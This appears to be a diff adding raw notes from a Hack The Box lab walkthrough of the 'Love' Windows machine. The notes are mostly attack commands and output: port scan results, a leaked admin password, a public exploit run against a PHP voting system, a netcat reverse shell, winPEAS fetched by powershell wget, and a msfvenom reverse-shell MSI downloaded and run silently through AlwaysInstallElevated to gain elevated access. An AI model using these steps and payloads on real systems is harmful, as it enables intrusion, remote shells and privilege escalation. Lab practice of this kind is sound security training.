@@ -1,0 +1,166 @@
+80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not set
+|_http-title: Voting System using PHP
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
+|_ssl-date: TLS randomness does not represent time
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+| tls-alpn: 
+|_  http/1.1
+|_http-title: 403 Forbidden
+| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
+| Not valid before: 2021-01-18T14:00:16
+|_Not valid after:  2022-01-18T14:00:16
+445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
+3306/tcp  open  mysql        MariaDB 10.3.24 or later (unauthorized)
+5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
+|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
+|_http-title: 403 Forbidden
+5040/tcp  open  unknown
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+5986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+| tls-alpn: 
+|_  http/1.1
+| ssl-cert: Subject: commonName=LOVE
+| Subject Alternative Name: DNS:LOVE, DNS:Love
+| Not valid before: 2021-04-11T14:39:19
+|_Not valid after:  2024-04-10T14:39:19
+|_ssl-date: 2025-11-19T13:20:40+00:00; -4m45s from scanner time.
+7680/tcp  open  pando-pub?
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49665/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49668/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+
+
+emailAddress = roy@love.htb
+CN = staging.love.htb
+OU = love.htb
+O = ValentineCorp
+L = norway
+ST = m
+
+
+http://staging.love.htb/beta.php
+
+http://127.0.0.1:5000
+
+Vote Admin Creds admin: @LoveIsInTheAir!!!!
+
+http://10.10.10.239/admin/home.php
+
+└─$ searchsploit -m 49445.py 
+
+└─$ python3 49445.py
+Start a NC listner on the port you choose above and run...
+Logged in
+Poc sent successfully
+
+└─$ nc -nvlp 8821
+listening on [any] 8821 ...
+connect to [10.10.16.16] from (UNKNOWN) [10.10.10.239] 52023
+b374k shell : connected
+
+Microsoft Windows [Version 10.0.19042.867]
+(c) 2020 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\omrs\images>id
+id
+'id' is not recognized as an internal or external command,
+operable program or batch file.
+
+C:\xampp\htdocs\omrs\images>whoami
+whoami
+love\phoebe
+
+
+ File Path Rule
+
+   Rule Type:               Msi
+   Enforcement Mode:        Enabled
+   Name:                    %OSDRIVE%\*
+   Translated Name:         c:
+   Description:             
+   Action:                  Deny
+   User Or Group Sid:       S-1-1-0
+
+   Conditions
+   Path:                    %OSDRIVE%\*
+    Directory "c:" Permissions: Phoebe [Allow: AllAccess]
+
+   =================================================================================================
+
+   File Path Rule
+
+   Rule Type:               Msi
+   Enforcement Mode:        Enabled
+   Name:                    %OSDRIVE%\Administration\*
+   Translated Name:         c:\administration
+   Description:             
+   Action:                  Allow
+   User Or Group Sid:       S-1-5-21-2955427858-187959437-2037071653-1002
+
+   Conditions
+   Path:                    %OSDRIVE%\Administration\*
+    Directory "c:\administration" Permissions: Phoebe [Allow: AllAccess],Authenticated Users [Allow: WriteData/CreateFiles]
+
+
+powershell wget http://10.10.14.6/winPEAS.exe -outfile wp.exe
+
+ RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
+    Key: StubPath
+    Folder: \
+    FolderPerms: Authenticated Users [Allow: AppendData/CreateDirectories]
+    File: /UserInstall
+
+
+����������͹ Checking AlwaysInstallElevated
+�  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
+    AlwaysInstallElevated set to 1 in HKLM!
+    AlwaysInstallElevated set to 1 in HKCU!
+
+
+https://medium.com/@amaraltohami30/privilege-escalation-using-alwaysinstallelevated-feature-in-windows-32f61babda49
+
+C:\xampp\htdocs\omrs\images>reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+
+HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+
+C:\xampp\htdocs\omrs\images> reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+ reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+
+HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+    AlwaysInstallElevated    REG_DWORD    0x1
+.
+
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.16 LPORT=8822 EXITFUNC=thread -f msi -o rev.msi 
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of msi file: 159744 bytes
+Saved as: rev.msi
+
+powershell wget http://10.10.16.16:8000/rev.msi -outfile rev.mis
+
+ run it with msiexec:
+
+ C:\Users\Phoebe\Desktop>msiexec /quiet /qn /i rev.mis
+msiexec /quiet /qn /i rev.mis
